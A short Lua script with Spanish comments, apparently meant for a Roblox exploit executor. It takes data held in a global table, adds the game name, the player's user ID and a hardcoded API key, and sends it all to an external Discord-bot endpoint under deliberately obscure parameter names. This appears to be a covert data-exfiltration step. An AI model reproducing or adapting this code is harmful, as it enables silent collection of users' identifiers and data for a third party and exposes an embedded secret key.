



-- * Conversión de _G.enviar a texto multilínea formateado
local resultado = ""

for etiqueta, valor in pairs(_G.enviar) do
  if valor and valor ~= "" then
    resultado = resultado .. "--> " .. etiqueta .. valor .. "\n"
  end
end

-- * Asignar a _G.infoo como bloque de texto multilínea
_G.infoo = resultado

-- * Armado de parámetros para la API
local clave  = "baSLsVSrMMfxlfAdleg6Lqey9N5G"
local marca  = _G.MARCA_DEL_JUEGO
local userID = _G.User_ID
local info   = _G.infoo

-- * Codificar para URL (espacios y saltos de línea)
local p1 = "Nkart=" .. clave
local p2 = "&IPFUEOPjd=" .. marca
local p3 = "&davvgfrF=" .. userID
local info_encoded = "&OIHDoihio=" .. info:gsub(" ", "%%20"):gsub("\n", "%%0A")

-- * Construir endpoint final
local endpoint = "https://botdiscord-production-204e.up.railway.app/enviar?" .. p1 .. p2 .. p3 .. info_encoded

-- * Envío del mensaje
local success, response = pcall(function()
  return game:HttpGet(endpoint)
end)

-- * Confirmación
if success then
  print("✅ Mensaje enviado correctamente.")
  print("📨 Respuesta:", response)
else
  warn("❌ Falló el envío:", response)
end
